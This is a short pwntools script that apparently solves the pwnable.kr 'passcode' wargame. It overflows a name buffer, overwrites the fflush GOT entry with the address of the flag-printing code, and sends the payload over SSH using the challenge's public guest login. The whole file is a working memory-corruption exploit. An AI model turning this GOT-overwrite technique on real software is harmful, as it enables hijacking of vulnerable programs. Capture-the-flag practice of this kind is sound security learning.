#!/bin/usr/python3
from pwn import *

context.log_level = "info"

offset = 0x60

fflush_got = 0x804a004
# sys_cat_flag must be string type since that scanf input the %s type
sys_cat_flag = str(0x80485e3)
info("sys cat flag = %s", sys_cat_flag)

payload = flat(
	offset * b'a',
	p32(fflush_got),
	sys_cat_flag
)

f = open("payload", "wb")
f.write(payload)
f.close()

s = ssh(host = 'pwnable.kr', user = 'passcode', port = 2222, password = 'guest')
r = s.process('./passcode')

r.sendlineafter("enter you name :", payload)
r.interactive()




